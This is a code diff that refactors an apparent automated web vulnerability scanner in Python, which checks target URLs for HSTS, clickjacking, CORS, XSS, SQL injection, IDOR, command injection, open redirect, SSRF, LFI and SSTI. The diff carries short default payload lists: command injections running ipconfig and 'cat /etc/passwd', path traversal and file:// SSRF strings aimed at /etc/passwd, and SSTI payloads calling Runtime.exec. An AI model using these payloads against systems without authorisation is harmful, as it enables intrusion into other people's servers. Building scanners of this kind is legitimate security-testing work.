@@ -64,210 +64,150 @@ def all_list(l,c,cl,h,x,lf,s,i,r,rc,sr,sst,output,fname,o,vulnerables_urls,op,pa
              try:    
                  req=requests.get(linea,timeout=10.0)
                  headers=req.headers
-             except:        
+             except URLError:        
                  print(f'\033[1;31{req.status_code} [?] open Url Error\033[0m')
                  indice+=1
-                          
-         if h:
-             try:   
-                 if 'strict-transport-security' not in headers:
-                     print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mNot force HSTS\033[0m')
-                     vulnerables_urls.append('****************** VULNERABLE TO HSTS: *********************')
-                     vulnerables_urls.append(linea)      
-                 else:
-                     print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mHSTS is OK\033[0m')  
-             except:
-                 pass
-         if cl:
-             try:    
-                 if 'x-frame-options' not in headers:
-                     if 'content-security-policy' not in headers:
-                         print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mvulnerable to Clickjacking\033[0m')
-                         vulnerables_urls.append('****************** VULNERABLE TO CLICKJACKING: *********************')
-                         vulnerables_urls.append(linea)
-                     else:
-                         print ('\033[1;31m[-]\033[0m '  + linea + ' \033[1;31mis not vulnerable to Clickjacking\033[0m')
-                 else:
-                     print ('\033[1;31m[-]\033[0m '  + linea + ' \033[1;31mis not vulnerable to Clickjacking\033[0m')
-             except:
-                 pass            
-         if c:
-             try:           
-                     headers2 = {"Origin": "https://evil.com"}
-                    
-                     req=requests.get(linea,headers=headers2,timeout=50)
-                     if 'access-control-allow-origin' in headers:
-                         if 'https://evil.com' in req.headers:
-                             print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mis vulnerable to Cors\033[0m')
-                             vulnerables_urls.append('****************** VULNERABLE TO CORS: *********************') 
-                             vulnerables_urls.append(linea)                           
-                         else:
-                             print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mis not vulnerable to Cors\033[0m')
-                     else:
-                         print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mis not vulnerable to Cors\033[0m')
-             except:
-                 pass              
-         if x:
+         try:                          
+                if h:   
+                        if 'strict-transport-security' not in headers:
+                            print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mNot force HSTS\033[0m')
+                            vulnerables_urls.append('****************** VULNERABLE TO HSTS: *********************')
+                            vulnerables_urls.append(linea)      
+                        else:
+                            print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mHSTS is OK\033[0m')  
+                if cl:    
+                        if 'x-frame-options' not in headers:
+                            if 'content-security-policy' not in headers:
+                                print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mvulnerable to Clickjacking\033[0m')
+                                vulnerables_urls.append('****************** VULNERABLE TO CLICKJACKING: *********************')
+                                vulnerables_urls.append(linea)
+                            else:
+                                print ('\033[1;31m[-]\033[0m '  + linea + ' \033[1;31mis not vulnerable to Clickjacking\033[0m')
+                        else:
+                            print ('\033[1;31m[-]\033[0m '  + linea + ' \033[1;31mis not vulnerable to Clickjacking\033[0m')            
+                if c:           
+                            headers2 = {"Origin": "https://evil.com"}
+                            
+                            req2=requests.get(linea,headers=headers2,timeout=50)
+                            if 'access-control-allow-origin' in req2.headers:
+                                if 'https://evil.com' in req2.headers:
+                                    print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mis vulnerable to Cors\033[0m')
+                                    vulnerables_urls.append('****************** VULNERABLE TO CORS: *********************') 
+                                    vulnerables_urls.append(linea)                           
+                                else:
+                                    print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mis not vulnerable to Cors\033[0m')
+                            else:
+                                print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mis not vulnerable to Cors\033[0m')
+         except:
+             pass
+
+         try:
              uri=[]
-             wordlist=['"><script>confirm(1)</script>','<h1>NELUXMATIZER</h1>']
              parametizer(linea,output,threads)
-             try:
-                 with open(output, "r") as f:
-                     for v in f.readlines():
-                         v = v.strip()
-                         if v == "" or v.startswith("#"):
-                             pass
-                         uri.append(v)
-                 if op:
-                     xss_params(uri,params,threads)
-                 else:                                             
-                     print()        
-                     print('\033[1;33mTest xss for default payload:\033[0m')       
-                     xss(uri,wordlist,vulnerables_urls,threads)           
-             except: 
-                  pass
-         if s:
-             uri=[]
-             wordlist=["%27"]
-             parametizer(linea,output,threads)   
-             try:
-                 with open(output, "r") as f:
+             with open(output, "r") as f:
                      for q in f.readlines():
                          q = q.strip()
                          if q == "" or q.startswith("#"):
                              pass
                          uri.append(q)
-                 if op:
+                                    
+         except:
+             indice+=1
+             continue                     
+         
+         if x:
+             #uri=[]
+             wordlist=['"><script>confirm(1)</script>','<h1>NELUXMATIZER</h1>']
+             #parametizer(linea,output,threads)
+             #aca empieza el cambio
+             print('hey aca')
+             if op:
+                     xss_params(uri,params,threads)
+             else:                                             
+                     print()        
+                     print('\033[1;33mTest xss for default payload:\033[0m')       
+                     xss(uri,wordlist,vulnerables_urls,threads)          
+             
+         if s:
+             #uri=[]
+             wordlist=["%27"]
+             #parametizer(linea,output,threads)   
+             if op:
                      sqli_params(uri,params,threads)
-                 else:                                     
+             else:                                     
                      print()        
                      print('\033[1;33mTest sqli for default payload:\033[0m')
                      print()        
                      sqli(uri,wordlist,vulnerables_urls,threads)           
-             except: 
-                  pass
+
          if i and op:
-             uri=[]
+             #uri=[]
              wordlist=['']   
-             parametizer(linea,output,threads)
-             try:
-                 with open(output, "r") as f:
-                     for j in f.readlines():
-                         j = j.strip()
-                         if j == "" or j.startswith("#"):
-                             pass
-                         uri.append(j)                    
-                     print()        
-                     print('\033[1;33mSearch idor parameters:\033[0m')
-                     print()        
-                     idor(uri,wordlist,vulnerables_urls,threads)           
-             except: 
-                  pass
+             #parametizer(linea,output,threads)
+             print()        
+             print('\033[1;33mSearch idor parameters:\033[0m')
+             print()        
+             idor(uri,wordlist,vulnerables_urls,threads)           
     
          if rc:
-             uri=[]
+             #uri=[]
              wordlist=['| ipconfig /all','; ipconfig /all','& ipconfig /all','| ifconfig',
              '& ifconfig', '; ifeconfig','&& ifconfig','system("cat /etc/passwd");','system("cat /etc/passwd");'
              ]
-             parametizer(linea,output,threads)
-             try:
-                 with open(output, "r") as f:
-                     for y in f.readlines():
-                         y = y.strip()
-                         if y == "" or v.startswith("#"):
-                             pass
-                         uri.append(y)
-                 if op:
+             #parametizer(linea,output,threads)
+             if op:
                      rce_params(uri,params,threads)
-                 else:                                             
+             else:                                             
                      print()        
                      print('\033[1;33mTest rce for default payload:\033[0m')       
                      rce(uri,wordlist,vulnerables_urls,threads)           
-             except: 
-                  pass
-
          if r: 
-             uri=[]
+             #uri=[]
              wordlist=['////google.com/','////google.com/','https:///google.com/','/https:google.com','<>javascript:alert(1);','http:///////////google.com']
-             parametizer(linea,output,threads)
-             try:
-                 with open(output, "r") as f:
-                         for m in f.readlines():
-                             m = m.strip()
-                             if m == "" or m.startswith("#"):
-                                 pass
-                             uri.append(m)                             
-                 if op:
+             #parametizer(linea,output,threads)                             
+             if op:
                          redirect_params(uri,params,threads)
-                 else:                                           
+             else:                                           
                          print()        
                          print('\033[1;33mTest redirect for default payload:\033[0m')       
                          redirect(uri,wordlist,vulnerables_urls,threads)           
-             except:  
-                 pass
-    
+             
          if sr:
-             uri=[]
-             wordlist=['file:///etc/passwd','file://\/\/etc/passwd','netdoc:///etc/passwd']   
-             parametizer(linea,output)
-             try:
-                 with open(output, "r") as f:
-                     for w in f.readlines():
-                         w = w.strip()
-                         if w == "" or w.startswith("#"):
-                             pass
-                         uri.append(w)
-                 if op:
+             #uri=[]
+             wordlist=['file:///etc/passwd','file://\/\/etc/passwd']   
+             #parametizer(linea,output,threads)
+             if op:
                      ssrf_params(uri,params,threads)
-                 else:                                     
+             else:                                     
                      print()        
                      print('\033[1;33mTest SSRF for default payloads:\033[0m')
                      print()        
                      ssrf(uri,wordlist,vulnerables_urls,threads)           
-             except: 
-                  pass
-
+             
          if lf:
-             uri=[]
+             #uri=[]
              wordlist=['../../../../../../../../../../../../../../../../../../../../../../etc/passwd']   
-             parametizer(linea,output,threads)
-             try:    
-                 with open(output, "r") as f:
-                     for z in f.readlines():
-                         z = z.strip()
-                         if z == "" or z.startswith("#"):
-                             pass
-                         uri.append(z)            
-                 if op:
+            #parametizer(linea,output,threads)
+             if op:
                      lfi_params(uri,params,threads)
-                 else:
+             else:
                      print()        
                      print('\033[1;33mTest lfi for default payload:\033[0m')
                      print()        
                      lfi(uri,wordlist,vulnerables_urls,threads)           
-             except: 
-                  pass
-
+             
          if sst:
-             uri=[]
+             #uri=[]
              wordlist=["<%= File.open('/etc/passwd').read %>","${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}"]   
-             parametizer(linea,output,threads)
-             try:
-                 with open(output, "r") as f:
-                     for k in f.readlines():
-                         k = k.strip()
-                         if k == "" or k.startswith("#"):
-                             pass
-                         uri.append(k)            
-                 if op:
+             #parametizer(linea,output,threads)
+             if op:
                      ssti_params(uri,params,threads)
-                 else:
+             else:
                      print()        
                      print('\033[1;33mTest ssti for default payloads:\033[0m')
                      print()        
                      ssti(uri,wordlist,vulnerables_urls,threads)           
-             except: 
-                  pass
+             
      except:
          print()
          print("\033[1;36m"+" CLOSE PROGRAM " + '\033[0;m')
